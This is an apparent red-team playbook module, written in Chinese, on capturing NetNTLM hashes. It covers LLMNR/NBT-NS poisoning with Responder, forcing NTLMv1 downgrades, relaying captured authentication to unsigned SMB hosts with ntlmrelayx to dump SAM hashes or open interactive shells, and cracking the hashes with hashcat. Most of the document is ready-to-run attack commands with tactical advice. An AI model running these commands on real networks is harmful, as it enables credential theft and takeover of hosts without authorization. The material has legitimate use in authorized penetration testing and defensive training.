# NetNTLM 捕获与通用 SMB Relay

> **TECH：** 毒化/诱捕得到 NetNTLM，破解或中继到 **未签名 SMB** 收割 SAM/交互  
> **IMPACT：** 口令 / NT / 目标主机本地哈希或 shell  
> **成功：** hash 可破或 SMB relay 产出 SAM/交互会话  
> **不是本文件：** PetitPotam/Coercer、LDAP→RBCD/Shadow、ESC8/ESC11（`/ad-attack`）

捕获链在本模块走完。AD identity sink 只交接，不把 getST/DCSync 写进来。

---

## 1. 先听再毒化

```bash
responder -I eth0 -A
```

有 LLMNR/NBT-NS/mDNS 请求再转正式模式。内网安静就不要空转 `-wFb` 一整天。

```bash
responder -I eth0 -wFb
```

输出：

```text
NTLMv2-SSP Hash : jen::CORP:...     → -m 5600
NTLMv1 Hash                         → -m 5500，看是否 ESS
```

---

## 2. NetNTLMv1 降级

部分主机仍接受 LM/NTLMv1。无 ESS 的 v1 接近直接 NT。

```bash
responder -I eth0 --lm --disable-ess
```

GATES：目标 LmCompatibilityLevel 允许 v1；现代默认可能拒绝，没有捕获就停，不要当通用路径。

```text
NTLMv1 无 ESS  → offline-crack.md 还原 NT
NTLMv1-SSP     → 当弱 v1 砸，不一定免费 NT
NTLMv2         → -m 5600 字典/规则；同时评估能否 SMB relay
```

---

## 3. 通用 SMB relay（signing 关闭）

```bash
nxc smb 192.168.50.0/24 --gen-relay-list targets.txt
nmap -Pn -p445 --script smb2-security-mode.nse TARGET
```

`targets.txt` 为空 = 都要求签名，**不要**对签名 mandatory 的主机 SMB relay。

```bash
# /etc/responder/Responder.conf
# SMB = Off
# HTTP = Off

impacket-ntlmrelayx -tf targets.txt -smb2support -i
responder -I eth0 -wFb
```

成功：`Relay succeeded` 后：

```bash
nc 127.0.0.1 11000
# 或 ntlmrelayx 的 --dump-sam / SOCKS
impacket-ntlmrelayx -tf targets.txt -smb2support --dump-sam sam_out
```

这是 **凭据收割**：得到目标 SAM/交互。记下主机与哈希。后续横向候选 `/ad-recon`（域内）或 `/post`（已有该主机控制）。

IPv6 / WPAD / HTTP 认证同样可当捕获源，sink 仍先选未签名 SMB。

---

## 4. 不要在这里执行的 sink

操作者若要把 **同一张** 入站 NTLM 打到 AD 身份：

```text
LDAP  --delegate-access          → RBCD        → 选 /ad-attack
LDAP  --shadow-credentials       → Shadow Cred → 选 /ad-attack
HTTP  ADCS --adcs --template     → ESC8        → 选 /ad-attack
ICPR / ESC11                     → 选 /ad-attack
Coercer / PetitPotam / PrinterBug 触发机器账户 → 选 /ad-attack
```

只在 notes 写：已有入站 NTLM、signing/CBT 现状、建议 sink。**本文件不贴 getST/DCSync 命令。**

LDAP signing required / EPA / channel binding = 该 sink 死，不是 EDR。

---

## 5. 抓到 hash 之后

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 5500 v1.txt --show
```

破解成功 → 当密码做复用校验（`spray-brute.md`）。砸不动 v2 → 只靠 relay。两条都失败 → 换喷洒/harvest，不要空转 GPU。

---

## RESTORE

停 Responder/ntlmrelayx。恢复 `Responder.conf` 的 SMB/HTTP。不要把 rogue WPAD 留在网上。
